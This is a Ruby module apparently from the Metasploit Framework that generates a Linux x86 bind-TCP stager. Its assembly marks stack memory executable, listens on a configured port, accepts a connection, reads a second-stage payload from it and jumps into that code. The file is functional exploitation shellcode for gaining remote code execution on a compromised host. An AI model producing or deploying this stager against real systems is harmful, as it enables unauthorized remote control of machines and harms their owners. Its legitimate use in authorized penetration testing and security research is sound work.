# -*- coding: binary -*-

require 'msf/core'
require 'msf/core/payload/transport_config'
require 'msf/core/payload/linux/send_uuid'

module Msf


###
#
# Complex bindtcp payload generation for Linux ARCH_X86
#
###


module Payload::Linux::BindTcp

  include Msf::Payload::TransportConfig
  include Msf::Payload::Linux
  include Msf::Payload::Linux::SendUUID

  #
  # Generate the first stage
  #
  def generate
    conf = {
      port:     datastore['LPORT'],
      reliable: false
    }

    # Generate the more advanced stager if we have the space
    if self.available_space && required_space <= self.available_space
      conf[:exitfunk] = datastore['EXITFUNC']
      conf[:reliable] = true
    end

    generate_bind_tcp(conf)
  end

  #
  # By default, we don't want to send the UUID, but we'll send
  # for certain payloads if requested.
  #
  def include_send_uuid
    false
  end

  def use_ipv6
    false
  end

  #
  # Generate and compile the stager
  #
  def generate_bind_tcp(opts={})
    asm = asm_bind_tcp(opts)
    Metasm::Shellcode.assemble(Metasm::X86.new, asm).encode_string
  end

  def transport_config(opts={})
    transport_config_bind_tcp(opts)
  end

  #
  # Determine the maximum amount of space required for the features requested
  #
  def required_space
    # Start with our cached default generated size
    space = cached_size

    # Reliability checks add 4 bytes for the first check, 5 per recv check (2)
    # TODO: coming soon
    #space += 14

    # The final estimated size
    space
  end

  #
  # Generate an assembly stub with the configured feature set and options.
  #
  # @option opts [Integer] :port The port to connect to
  # @option opts [Bool] :reliable Whether or not to enable error handling code
  #
  def asm_bind_tcp(opts={})

    #reliable     = opts[:reliable]
    af_inet = 2

    if use_ipv6
      af_inet = 0xa
    end

    encoded_port = "0x%.8x" % [opts[:port].to_i, af_inet].pack("vn").unpack("N").first

    asm = %Q^
      bind_tcp:
        push 0x7d                     ; mprotect syscall
        pop eax
        cdq
        mov dl,0x7
        mov ecx,0x1000
        mov ebx,esp
        and bx,0xf000
        int 0x80                      ; invoke mprotect
        xor ebx,ebx
        mul ebx
        push ebx                      ; PROTO
        inc ebx                       ; SYS_SOCKET and SOCK_STREAM
        push ebx
        push #{af_inet}               ; SYS_BIND and AF_INET(6)
        mov ecx,esp
        mov al,0x66                   ; socketcall syscall
        int 0x80                      ; invoke socketcall (SYS_SOCKET)

        ; set the SO_REUSEADDR flag on the socket
        push ecx
        push 4
        push esp
        push 2
        push 1
        push eax
        xchg eax,edi                  ; stash the socket handle
        mov ecx, esp
        push 0xe                      ; SYS_SETSOCKOPT
        pop ebx
        push 0x66                     ; socketcall syscall
        pop eax
        int 0x80
        xchg eax,edi                  ; restore the socket handle
        add esp, 0x14
        pop ecx                       ; restore ecx

        pop ebx
        pop esi
    ^

    if use_ipv6
      asm << %Q^
        push 2
        pop ebx
        push edx
        push edx
        push edx
        push edx
        push edx
        push edx
        push #{encoded_port}
        mov ecx,esp
        push 0x1c
      ^
    else
      asm << %Q^
        push edx
        push #{encoded_port}
        push 0x10
      ^
    end

    asm << %Q^
        push ecx
        push eax
        mov ecx,esp
        push 0x66                     ; socketcall syscall
        pop eax
        int 0x80                      ; invoke socketcall (SYS_BIND)

        shl ebx,1                     ; SYS_LISTEN
        mov al,0x66                   ; socketcall syscall (SYS_LISTEN)
        int 0x80                      ; invoke socketcall

        push eax                      ; stash the listen socket
        inc ebx                       ; SYS_ACCEPT
        mov al,0x66                   ; socketcall syscall
        mov [ecx+0x4],edx
        int 0x80                      ; invoke socketcall (SYS_ACCEPT)
        xchg eax,ebx
    ^

    if include_send_uuid
      asm << %Q^
        mov edi, ebx
        #{asm_send_uuid}
      ^
    end

    asm << %Q^
        mov dh,0xc                    ; at least 0x0c00 bytes
        mov al,0x3                    ; read syscall
        int 0x80                      ; invoke read
        xchg ebx,edi                  ; stash the accept socket in edi
        pop ebx                       ; restore the listen socket
        mov al,0x6                    ; close syscall
        int 0x80                      ; invoke close
        jmp ecx                       ; jump to the payload
    ^

    asm
  end

end

end


